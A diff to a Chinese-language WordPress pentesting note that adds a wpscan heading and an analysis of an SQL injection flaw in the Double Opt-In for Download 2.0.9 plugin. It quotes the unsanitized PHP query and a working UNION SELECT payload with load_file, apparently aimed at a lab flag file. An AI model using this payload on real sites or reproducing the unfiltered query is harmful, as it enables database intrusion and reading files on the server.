@@ -1,4 +1,6 @@
 很多企业官网使用的WordPress搭建。
+
+# **wpscan扫描器**
 使用wpscan工具扫描历史漏洞和插件组件漏洞。
 如：任意文件读取等。
 
@@ -143,3 +145,28 @@ Sysinfo
 
 如果找到了相匹配的用户名与密码，工具将直接以admin:password的形式显示出来：
 
+
+
+^
+# **wp扩展漏洞**
+WordPress Double Opt-In for Download 插件 2.0.9 版本中, public/class-doifd.php 文件中 populate_download_edit_form 函数中 id 参数未经过滤，直接拼接 SQL 语句，导致 SQL 注入漏洞。
+```
+public function populate_download_edit_form() {
+
+    global $wpdb; // this is how you get access to the database
+
+    if( isset( $_POST[ 'id' ] ) ) {
+
+        $value = $_POST[ 'id' ];
+
+        $download = $wpdb->get_row( "SELECT * FROM {$wpdb->prefix}doifd_lab_downloads WHERE doifd_download_id = $value", ARRAY_A );
+    }
+    echo json_encode( $download );
+    die(); // this is required to terminate immediately and return a proper response
+}
+```
+这里的$_POST[ ‘id’ ]没有经过过滤直接带入了sql语句，造成了sql注入。
+注册登录，POST发送如下数据包：
+```
+/wp-admin/admin-ajax.php?action=populate_download_edit_form id=0 union select 1,2,3,4,5,6,load_file(0x2f666c61675f69735f68657265)
+```
